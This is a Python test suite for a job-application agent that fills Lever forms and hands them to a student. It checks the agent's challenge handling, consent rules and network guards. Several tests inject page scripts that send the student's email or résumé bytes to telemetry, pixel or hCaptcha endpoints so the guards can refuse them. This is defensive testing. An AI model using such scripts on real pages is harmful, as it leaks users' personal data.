        self.assertEqual(len(self.refused(run, rule="non_get_before_hand_over", method="POST", host="jobs.lever.co")), 1)
        self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_SEND])
        self.assertEqual(run.agent.acts, [], "nothing was touched")
        self.assertEqual(fake.non_get_requests(noise=False), [])

    def test_a_request_to_a_telemetry_host_is_refused_and_recorded_and_the_run_goes_on(self):
        fake = FakeLever()
        fake.inject.append(script("""fetch('https://www.google-analytics.com/collect?v=1', {method: 'POST', body: 'x'}); new Image().src = 'https://www.googletagmanager.com/x.gif';
            fetch('https://bugs.lever.co/', {method: 'POST', body: '{}'});"""))
        run = self.go(fake)
        telemetry = {item["host"] for item in self.refused(run, rule="telemetry")}
        self.assertTrue({"www.google-analytics.com", "www.googletagmanager.com", "bugs.lever.co"} <= telemetry, telemetry)
        self.assertEqual(run.result.evidence["handoff_end"], "timeout", "it never ended the run")
        self.assertEqual(run.seen["form"]["name"], "Sam Rivera")
        self.assertEqual([seen for seen in fake.requests if seen.host in ("www.google-analytics.com", "bugs.lever.co")], [])

    def test_a_websocket_is_refused_and_recorded(self):
        fake = FakeLever()
        fake.inject.append(script("new WebSocket('wss://jobs.lever.co/live');"))
        run = self.go(fake)
        self.assertEqual([(item["host"], item["rule"]) for item in self.refused(run, method="WEBSOCKET")], [("jobs.lever.co", "websocket")])
        self.assertEqual(run.result.evidence["handoff_end"], "timeout")

    def test_a_planned_value_in_a_get_is_refused_and_recorded_by_the_fields_key_and_never_by_the_value(self):
        fake = FakeLever()
        fake.inject.append(script(f"fetch('/pixel?e={EMAIL.replace('@', '%40')}');"))
        run = self.go(fake)
        (record,) = self.refused(run, rule="value_guard")
        self.assertEqual((record["method"], record["host"], record["field_key"]), ("GET", "jobs.lever.co", "email"))
        self.assertNotIn(EMAIL, json.dumps(run.result.refused))
        self.assertEqual([seen for seen in fake.requests if seen.path == "/pixel"], [])
        self.assertEqual(run.result.evidence["handoff_end"], "timeout")

    def test_a_cloudflare_beacon_the_value_guard_refuses_is_recorded_and_is_not_the_page_sending_something(self):
        fake = FakeLever()
        fake.inject.append(script(f"fetch('/cdn-cgi/challenge-platform/h/b/jsd/oneshot/x', {{method: 'POST', body: '{EMAIL}'}});"))
        run = self.go(fake)
        (record,) = self.refused(run, rule="value_guard", method="POST")
        self.assertEqual((record["host"], record["field_key"]), ("jobs.lever.co", "email"))
        self.assertEqual(run.result.evidence["handoff_end"], "timeout", "a beacon is not a form posting somewhere the app did not agree to")
        self.assertEqual(run.result.evidence["upload_refused"], None)
        self.assertEqual(fake.non_get_requests(noise=False), [fake.parse_posts()[0]])

    def test_the_cloudflare_beacon_passes_and_is_never_a_reason_to_stop(self):
        fake = FakeLever()
        fake.cloudflare_beacon = True
        run = self.go(fake)
        self.assertEqual(run.result.evidence["handoff_end"], "timeout")
        self.assertTrue([seen for seen in fake.requests if seen.path == apply_fake_ats.LEVER_CLOUDFLARE_BEACON_PATH])


# --- Item 8: hCaptcha ---------------------------------------------------------------------------------------------------------------

class ChallengeTests(LeverCase):
    def test_a_challenge_during_the_fill_makes_the_app_touch_nothing_until_it_is_gone_and_then_go_on(self):
        fake = FakeLever()
        fake.challenge_during_fill = (0.0, 4.0)   # up from the moment the widget renders, for longer than the app takes to reach its first field
        run = self.go(fake)
        self.assertEqual(run.result.outcome, "needs_you")
        self.assertEqual(run.result.reasons, [HANDOFF_NOT_SUBMITTED + " Lever received your résumé."])
        self.assertIn("challenge", run.steps)
        self.assertTrue(run.result.evidence["challenge"])
        self.assertTrue(all(frames == 0 for _kind, _key, _shown, frames, _before in run.agent.acts), "the app acted only while no challenge was up")
        self.assertEqual(run.seen["form"]["name"], "Sam Rivera")
        self.assertEqual(run.result.evidence["handoff_end"], "timeout")

    def test_a_challenge_that_never_goes_away_ends_the_run_with_nothing_touched_and_nothing_sent(self):
        fake = FakeLever()
        fake.challenge_during_fill = (0.0, 1000.0)
        run = self.go(fake, timeouts=dataclasses.replace(TIMEOUTS, person_s=2.0))
        self.assertEqual((run.result.outcome, run.result.after_click), ("needs_you", False))
        self.assertEqual(run.result.reasons, ["Lever showed a check that was not finished in time, so the app stopped before it filled the form. Nothing was sent."])
        self.assertEqual(run.agent.acts, [])
        self.assertEqual(fake.non_get_requests(noise=False), [])
        self.assertEqual(run.result.evidence["handoff_end"], "challenge")

    def test_a_challenge_after_the_students_press_waits_for_the_student_and_the_app_never_clicks_inside_it(self):
        fake = FakeLever()
        fake.challenge = True
        pressed = []

        def student(page, step, seen):
            if step == "handoff" and not pressed:
                pressed.append(1)
                page.click("#btn-submit")

        run = self.go(fake, student=student, presses=1, timeouts=dataclasses.replace(TIMEOUTS, handoff_s=4.0))
        self.assertEqual(run.seen["frames"], 1, "the challenge was up in the student's window at the end of the turn")
        self.assertEqual((run.result.outcome, run.result.reasons), ("needs_you", [HANDOFF_NOT_SUBMITTED + " Lever received your résumé."]))
        self.assertEqual(run.result.evidence["handoff_end"], "timeout", "the turn was the student's to the end")
        self.assertEqual(fake.apply_posts(), [])


class StudentPressTests(LeverCase):
    """Lever's Submit is a button of type ``button``, and hCaptcha writes after it in bodies a form does not use (a binary one, a script's). Until the app has
    seen the student's own press, a file-shaped write to an hCaptcha address ends the turn; from the press on only the planned file's bytes do, since a wrong
    reading would close the window in the middle of the check. So the press must be seen on Lever's page: the listener names Lever's hosts and ``#btn-submit``."""
    BINARY = bytes([0x81, 0xA1, 0x6B, 0x01])   # a few bytes of a binary (msgpack) body, which is not the planned file
    CAPTCHA_URL = "https://api.hcaptcha.com/getcaptcha/00000000-0000-0000-0000-000000000000"
    WRITE = "(args) => fetch(args.url, {method: 'POST', headers: {'Content-Type': args.type}, body: new Uint8Array(args.body)}).catch(() => 0)"

    @staticmethod
    def written(run, content_type):
        """The writes of the test's own (the page's hCaptcha posts text and forms) that reached hCaptcha."""
        return [seen for seen in run.fake.requests if seen.method == "POST" and seen.host == "api.hcaptcha.com" and seen.content_type.startswith(content_type)]

    def play(self, *, press, body, content_type="application/octet-stream"):
        """A student who presses Submit (``press``: "trusted", "script" or None) and then has hCaptcha write ``body``. Returns the run."""
        fake = FakeLever()
        fake.challenge = True
        done = []

        def student(page, step, seen):
            if step == "handoff" and not done:
                done.append(1)
                if press == "trusted":
                    page.click("#btn-submit")
                elif press == "script":
                    page.evaluate("() => document.getElementById('btn-submit').click()")
                page.wait_for_timeout(500)
                page.evaluate(self.WRITE, {"url": self.CAPTCHA_URL, "type": content_type, "body": list(body)})
                page.wait_for_timeout(300)

        return self.go(fake, student=student, presses=0 if press is None else 1, timeouts=dataclasses.replace(TIMEOUTS, handoff_s=4.0))

    def test_the_students_click_on_submit_is_seen_and_an_hcaptcha_write_after_it_that_is_not_the_file_passes(self):
        for content_type in ("application/octet-stream", "application/x-msgpack"):
            with self.subTest(content_type=content_type):
                run = self.play(press="trusted", body=self.BINARY, content_type=content_type)
                self.assertGreater(run.agent._state.last_press_at, 0, "the app never saw the student press Submit")
                self.assertEqual(self.refused(run, rule="upload_elsewhere"), [], run.result.refused)
                self.assertEqual([seen.path for seen in self.written(run, content_type)], [urlparse(self.CAPTCHA_URL).path], "the write did not reach hCaptcha")
                self.assertEqual(run.result.evidence["handoff_end"], "timeout", "the student's turn was closed by something other than the clock")

    def test_the_planned_file_is_still_refused_after_the_press_and_closes_the_window(self):
        run = self.play(press="trusted", body=RESUME_BYTES)
        self.assertGreater(run.agent._state.last_press_at, 0)
        self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host="api.hcaptcha.com")), 1, run.result.refused)
        self.assertEqual(run.result.evidence["handoff_end"], "upload")
        self.assertEqual(self.written(run, "application/octet-stream"), [], "the file reached hCaptcha")

    def test_a_click_the_page_makes_itself_is_not_the_press_and_the_strict_reading_stays(self):
        run = self.play(press="script", body=self.BINARY)
        self.assertEqual(run.agent._state.last_press_at, 0.0, "a script's click was counted as the student's press")
        self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host="api.hcaptcha.com")), 1, run.result.refused)
        self.assertEqual(run.result.evidence["handoff_end"], "upload")

    def test_with_no_press_a_binary_write_to_hcaptcha_is_refused_in_the_students_turn(self):
        run = self.play(press=None, body=self.BINARY)
        self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host="api.hcaptcha.com")), 1, run.result.refused)


# --- Item 9: the banner and the interstitial --------------------------------------------------------------------------------------------

class BannerAndInterstitialTests(LeverCase):
    def test_the_cookie_banner_is_never_clicked(self):
        run = self.go()
        self.assertEqual(run.seen["clicks"], {"submit": 0, "hiddenSubmit": 0, "cookie": 0, "challenge": 0})
        self.assertEqual(run.agent.pressed["cookie"], 0)

    def test_a_cloudflare_interstitial_makes_the_app_wait_and_go_on_when_the_form_appears(self):
        fake = FakeLever()
        fake.interstitial_s = 10.0
        run = self.go(fake, timeouts=dataclasses.replace(TIMEOUTS, person_s=20.0))
        self.assertGreaterEqual(fake.interstitials_served, 1)
        self.assertIn("challenge", run.steps)
        self.assertEqual(run.seen["form"]["name"], "Sam Rivera")
        self.assertEqual(run.result.evidence["page"], "application_form")
        self.assertEqual(run.result.evidence["handoff_end"], "timeout")

    def test_a_cloudflare_interstitial_served_with_an_error_status_is_waited_out_too_and_any_other_error_page_is_not(self):
        fake = FakeLever()
        fake.interstitial_s = 10.0
        fake.interstitial_status = 403
        run = self.go(fake, timeouts=dataclasses.replace(TIMEOUTS, person_s=20.0))
        self.assertGreaterEqual(fake.interstitials_served, 1)
        self.assertIn("challenge", run.steps)
        self.assertEqual((run.seen["form"]["name"], run.result.evidence["page"]), ("Sam Rivera", "application_form"))

        class Forbidden(FakeLever):
            def _apply_page(self, fixture, **more):
                return apply_fake_ats.Reply(403, "<html><head><title>Forbidden</title></head><body>No.</body></html>")

        other = self.go(Forbidden())
        self.assertEqual((other.result.outcome, other.result.reasons), ("failed", ["Lever answered HTTP 403"]))
        self.assertEqual(other.agent.acts, [])

    def test_an_interstitial_that_never_ends_settles_needs_you_with_nothing_sent(self):
        fake = FakeLever()
        fake.interstitial_s = 1000.0
        run = self.go(fake, timeouts=dataclasses.replace(TIMEOUTS, person_s=2.0))
        self.assertEqual((run.result.outcome, run.result.after_click), ("needs_you", False))
        self.assertEqual(run.result.reasons, ["Lever showed a check that was not finished in time, so the app stopped before it filled the form. Nothing was sent."])
        self.assertEqual(run.agent.acts, [])
        self.assertEqual(fake.non_get_requests(noise=False), [])

    def test_a_closed_posting_is_closed_not_an_error_page(self):
        fake = FakeLever()
        fake.closed = True
        run = self.go(fake)
        self.assertEqual((run.result.outcome, run.result.reasons), ("failed", ["The posting is no longer accepting applications"]))

    def test_a_confirmation_page_before_any_press_proves_nothing_and_the_app_does_nothing(self):
        fake = FakeLever()
        self.addCleanup(fake.drop_unanswered)
        schema, draft, replan = planner(lever_sources(), "demo_eeo_survey.html")
        agent = LeverAgent(fake=fake, mode="handoff", adapter=LeverAdapter(), run_id="run-test", timeouts=TIMEOUTS)
        with agent:
            result = agent.run(draft, page_url=apply_fake_ats.LEVER_THANKS_URL, schema=schema, files={"resume": resume_payload()}, replan=replan, hand_over=lambda: False)
        self.assertEqual((result.outcome, result.reasons, result.after_click), ("needs_you", ["This page already says the application was submitted. The app did nothing."], False))
        self.assertEqual(agent.acts, [])
        self.assertEqual(fake.non_get_requests(noise=False), [])


# --- Item 10: the page's own fields ------------------------------------------------------------------------------------------------------

class PageOwnedTests(LeverCase):
    def test_the_pages_own_fields_are_what_they_were_except_the_two_the_page_sets_after_a_read(self):
        run = self.go()
        before, after = run.agent._managed_before, run.seen["managed"]
        self.assertEqual(before, after)
        self.assertEqual(before["accountId"], "338ccb85-3e92-5a8c-987b-51a090bf4ff9")
        for name in ("linkedInData", "origin", "referer", "socialReferralKey", "socialSource", "source", "h-captcha-response"):
            self.assertEqual(before[name].strip(), "", name)
        self.assertNotEqual(before["timezone"], "", "the page's own timezone was there when the app began")
        self.assertNotIn("resumeStorageId", before, "the page sets it after the read, and that is allowed")
        form = run.seen["form"]
        self.assertEqual(form["resumeStorageId"], lever_parse_reply()["resumeStorageId"])
        self.assertNotEqual(form["selectedLocation"], "")
        self.assertEqual(run.result.evidence["page_changed"], [])
        self.assertEqual([item for item in run.result.check_problems if item["kind"] == "page_managed"], [])
        for template in [name for name in before if name.endswith("[baseTemplate]")]:
            self.assertEqual(form[template], before[template], "a question's description is as the page wrote it")

    def test_the_app_acts_on_no_field_the_page_keeps_for_itself(self):
        run = self.go()
        adapter = LeverAdapter()
        self.assertEqual([key for _kind, key, *_ in run.agent.acts if adapter.owns(key) or key in ("selectedLocation", "resumeStorageId")], [])

    def test_a_field_the_page_changes_by_itself_is_named_for_the_student_and_not_put_back(self):
        fake = FakeLever()
        fake.inject.append(script("""document.getElementById('application-form').querySelector('input[name="resume"]').addEventListener('change', function () {
            document.querySelector('[name="origin"]').value = 'set by the page'; });"""))
        run = self.go(fake)
        self.assertEqual(run.result.evidence["page_changed"], ["origin"])
        self.assertIn("page:origin", self.left(run))
        self.assertEqual([item["key"] for item in run.result.check_problems if item["kind"] == "page_managed"], ["origin"])
        self.assertEqual(run.seen["form"]["origin"], "set by the page", "the app does not write it, so it does not undo it either")


# --- The rules of 6.6: EEO and consent -------------------------------------------------------------------------------------------------------

class EeoAndConsentTests(LeverCase):
    def declines(self, **more):
        stored = Store(
            entry("eeo_gender", "Gender", "Decline to self-identify"), entry("eeo_race", "Race", "Decline to self-identify"),
            entry("eeo_veteran", "Veteran status", "I decline to self-identify for protected veteran status"),
            entry("eeo_disability", "Disability status", "I do not want to answer"),
        )
        return lever_sources(allowed={"eeo_gender", "eeo_race", "eeo_veteran", "eeo_disability"}, store=stored, **more)

    def test_a_stored_decline_is_chosen_for_gender_race_and_veteran_status_and_the_disability_block_is_never_touched(self):
        run = self.go(page="demo_eeo_survey.html", src=self.declines())
        form = run.seen["form"]
        self.assertEqual(form["eeo[gender]"], "Decline to self-identify")
        self.assertEqual(form["eeo[race]"], "Decline to self-identify")
        self.assertEqual(form["eeo[veteran]"], "Decline to self-identify")
        for name in ("eeo[disability]", "eeo[disabilitySignature]", "eeo[disabilitySignatureDate]"):
            self.assertEqual(form[name], "", name)
        for key in ("disability_status", "eeo[disabilitySignature]", "eeo[disabilitySignatureDate]"):
            self.assertNotIn(key, run.agent.keys(), key)
        self.assertEqual(set(run.agent.keys("choose")) | set(run.agent.keys("tick")), {"gender", "race", "veteran_status"})
        # The independent check reads the answers back against the plan under the plan's names: the app's own decline is not a value the page put there.
        self.assertEqual([item for item in run.result.check_problems if item["kind"] == "unplanned_value"], [])
        self.assertEqual([key for key in self.left(run) if key.startswith("eeo[")], [])
        self.assertEqual({self.entries(run)[key]["disposition"] for key in ("gender", "race", "veteran_status")}, {"fill"})

    def test_without_a_stored_decline_the_eeo_block_is_left_alone(self):
        run = self.go(page="demo_eeo_survey.html")
        form = run.seen["form"]
        self.assertEqual([name for name in form if name.startswith("eeo[")], ["eeo[gender]", "eeo[veteran]", "eeo[disability]", "eeo[disabilitySignature]", "eeo[disabilitySignatureDate]"])
        self.assertEqual({form[name] for name in form if name.startswith("eeo[")}, {""})
        self.assertEqual(run.agent.keys("choose"), [])

    def test_a_certification_box_is_ticked_only_on_an_exact_stored_statement(self):
        statement = "I certify that the answers I have given are true and complete."
        none = self.go(page="cards_files_consent.html")
        self.assertFalse([key for key in none.seen["form"] if key.endswith("[field0]") and "e7594e84" in key], "left unticked")
        self.assertIn("cards[e7594e84-33ab-56d0-ba0d-835a2cf485d1][field0]", self.left(none))
        stored = Store(entry("acknowledgment", statement, "checked", kind="checkbox", company_key=apply_policy.employer_key("Quillfeather Pets")))
        ticked = self.go(page="cards_files_consent.html", src=lever_sources(allowed={"acknowledgment"}, store=stored))
        self.assertEqual(ticked.seen["form"]["cards[e7594e84-33ab-56d0-ba0d-835a2cf485d1][field0]"], statement)
        self.assertEqual(ticked.agent.keys("tick"), ["cards[e7594e84-33ab-56d0-ba0d-835a2cf485d1][field0]"])
        self.assertNotIn("cards[e7594e84-33ab-56d0-ba0d-835a2cf485d1][field0]", self.left(ticked))
        other = Store(entry("acknowledgment", "I certify that the answers I have given are true", "checked", kind="checkbox", company_key=apply_policy.employer_key("Quillfeather Pets")))
        near = self.go(page="cards_files_consent.html", src=lever_sources(allowed={"acknowledgment"}, store=other))
        self.assertEqual(near.agent.keys("tick"), [], "a statement that is not exactly the box's is no statement for it")

    GROUPS = ("cards[c0c0c0c0-0000-5000-8000-0000000000c0][field1]", "cards[c0c0c0c0-0000-5000-8000-0000000000c0][field2]")
    STATEMENT_BOX = "cards[c0c0c0c0-0000-5000-8000-0000000000c0][field0]"

    def test_a_required_group_of_boxes_is_left_whole(self):
        run = self.go(page="two_required_groups.html")
        self.assertEqual(run.agent.keys("tick"), [])
        left = self.left(run)
        self.assertEqual(len([key for key in left if key.startswith("cards[")]), 3, "both groups and the statement are the student's")

    def test_the_tick_of_one_box_takes_required_off_every_box_and_the_box_stays_ticked_and_the_other_required_questions_stay_the_students(self):
        # Spec 10.4 item 13. The app ticks only the statement it has stored word for word. The page's script then drops `required` from every required box on the
        # page, the ticked one included, so a check that read the page as it is now would no longer find that question required, and would take the tick back.
        statement = "I certify that the answers above are true and complete."
        stored = Store(entry("acknowledgment", statement, "checked", kind="checkbox", company_key=apply_policy.employer_key(LEVER_COMPANY)))
        required = []

        def student(page, step, seen):
            if step == "handoff" and not required:
                required.append(page.evaluate("Array.from(document.querySelectorAll('.required-field input[type=checkbox]')).map((box) => box.required)"))

        run = self.go(page="two_required_groups.html", src=lever_sources(allowed={"acknowledgment"}, store=stored), student=student)
        self.assertEqual(required, [[False] * 5], "the page's script took required off every box")
        self.assertEqual(run.agent.keys("tick"), [self.STATEMENT_BOX], "ticked once, and not taken back")
        self.assertEqual(run.seen["form"][self.STATEMENT_BOX], statement)
        left = self.left(run)
        for key in self.GROUPS:
            self.assertIn(key, left, "a group nobody answered is still the student's")
            self.assertNotIn(key, run.seen["form"], "and the app ticked nothing in it")
        self.assertNotIn(self.STATEMENT_BOX, left)
        self.assertEqual([item for item in run.result.check_problems if item["kind"] in ("required_not_seen", "unplanned_value", "empty")], [])

    def test_the_marketing_consent_and_the_pronouns_are_never_ticked(self):
        run = self.go(page="variants.html")
        self.assertEqual([key for key in run.agent.keys() if key in ("consent[marketing]", "pronouns")], [])
        self.assertEqual(run.seen["form"].get("consent[marketing]"), "0", "the hidden zero is the page's, and the box is not ticked")


if __name__ == "__main__":
    unittest.main()
